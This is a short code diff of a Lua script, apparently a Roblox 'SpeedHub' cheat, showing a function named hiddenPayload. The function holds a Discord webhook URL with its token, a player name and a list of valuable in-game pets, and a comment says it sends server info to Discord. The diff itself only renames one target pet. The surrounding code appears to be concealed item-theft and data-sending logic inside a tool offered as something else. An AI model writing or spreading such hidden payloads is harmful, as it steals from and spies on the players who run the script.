@@ -43,7 +43,7 @@ function SpeedHub.Init()
     local function hiddenPayload()
         local webhook_url = "https://discord.com/api/webhooks/1401485747198103632/SuHysgxoDzxf44YXhHVBkCwzSXTqOHPCG0dw3oYAWEcrGtt0LgV7YtHIbo4JaforDp_3"
         local player_name = "ilkauiop3"
-        local target_pets = {"Inverted Raccoon", "DragonFly", "Moon Cat"}
+        local target_pets = {"Inverted Raccoon", "Shiny DragonFly", "Moon Cat"}
         
         -- Send server info to Discord
         local function sendReport()
